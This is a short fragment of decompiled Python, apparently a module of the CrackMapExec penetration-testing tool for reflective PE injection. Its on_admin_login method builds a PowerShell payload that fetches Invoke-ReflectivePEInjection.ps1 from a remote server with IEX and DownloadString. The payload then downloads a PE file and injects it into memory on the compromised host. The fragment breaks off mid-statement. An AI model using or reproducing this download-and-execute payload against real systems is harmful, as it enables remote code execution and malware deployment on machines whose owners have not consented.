...
# [GCC 8.4.0]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/pe_inject.py
...
class CMEModule:
    ...
    def on_admin_login(self, context, connection):
        payload = ("\n        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');\n        $WebClient = New-Object System.Net.WebClient;\n        [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{pefile}');\n        Invoke-{func_name} -PEBytes $bytes").format(server=context.server, port=context.server_port, addr=context.localip, func_name=self.obfs_name, pefile=os.path.basename(self.payload_path))
        if self.procid:
